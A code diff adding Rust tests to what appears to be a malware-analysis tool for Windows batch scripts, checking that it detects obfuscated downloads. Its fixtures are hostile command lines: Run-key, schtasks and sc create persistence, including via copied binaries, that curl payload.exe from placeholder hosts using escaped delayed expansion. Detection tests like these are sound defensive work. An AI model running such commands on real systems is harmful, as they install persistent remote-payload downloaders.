@@ -1778,6 +1778,26 @@ echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadm
     }
 
     #[test]
+    fn reg_add_comspec_run_key_preserves_escaped_delayed_expansion() {
+        let script = br#"@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "%COMSPEC% /V:ON /c set U=https://reg-escaped-comspec.example/payload.exe&&curl -o payload.exe ^!U^!" /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://reg-escaped-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "persisted escaped COMSPEC Run-key command download missing: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn reg_add_run_key_preserves_quoted_command_with_escaped_quotes() {
         let script = br##"@echo off
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Quoted" /t REG_SZ /d "cmd /c \"echo https://reg-escape.example/payload.exe\" & mshta.exe \"stage.hta\"" /f
@@ -1933,6 +1953,26 @@ schtasks /change /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks-change.e
             )),
             "changed scheduled-task action download missing: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn schtasks_comspec_task_run_preserves_escaped_delayed_expansion() {
+        let script = br#"@echo off
+schtasks /create /tn Updater /tr "%COMSPEC% /V:ON /c set U=https://schtasks-escaped-comspec.example/payload.exe&&curl -o payload.exe ^!U^!" /sc once /st 00:00 /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://schtasks-escaped-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "persisted escaped COMSPEC scheduled-task command download missing: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 
@@ -13201,6 +13241,34 @@ sc create UpdateSvc binPath= "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
     }
 
     #[test]
+    fn sc_create_comspec_binpath_preserves_escaped_delayed_expansion() {
+        let script = br#"sc create UpdateSvc binPath= "%COMSPEC% /V:ON /c set U=https://sc-escaped-comspec.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("%COMSPEC% /V:ON /c set U=")
+            )),
+            "service install trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://sc-escaped-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "escaped COMSPEC service binPath child command was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn remote_sc_create_binpath_cmd_child_is_analyzed() {
         let script = br#"sc \\target.example create UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://remote-sc-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
@@ -24365,6 +24433,26 @@ C:\Users\Public\st.tmp /create /tn "Updater" /tr "cmd /c curl -o out.exe https:/
     }
 
     #[test]
+    fn copied_schtasks_alias_comspec_tr_preserves_escaped_delayed_expansion() {
+        let script = br#"copy C:\Windows\System32\schtasks.exe C:\Users\Public\st.tmp
+C:\Users\Public\st.tmp /create /tn Updater /tr "%COMSPEC% /V:ON /c set U=https://copied-schtasks-delayed.example/payload.exe&&curl -o payload.exe ^!U^!" /sc once /st 00:00 /f
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-schtasks-delayed.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied schtasks delayed action download missing: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn copied_sc_alias_create_binpath_cmd_child_is_analyzed() {
         let script = br#"copy C:\Windows\System32\sc.exe C:\Users\Public\svc.tmp
 C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.exe https://copied-sc-binpath.example/payload.exe""#;
@@ -24397,6 +24485,24 @@ C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.ex
                         && dst.as_deref() == Some("payload.exe")
             )),
             "copied sc binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_sc_alias_comspec_binpath_preserves_escaped_delayed_expansion() {
+        let script = br#"copy C:\Windows\System32\sc.exe C:\Users\Public\svc.tmp
+C:\Users\Public\svc.tmp create UpdateSvc binPath= "%COMSPEC% /V:ON /c set U=https://copied-sc-delayed.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-sc-delayed.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied sc delayed binPath child command was not analyzed: {:?}",
             report.traits
         );
     }
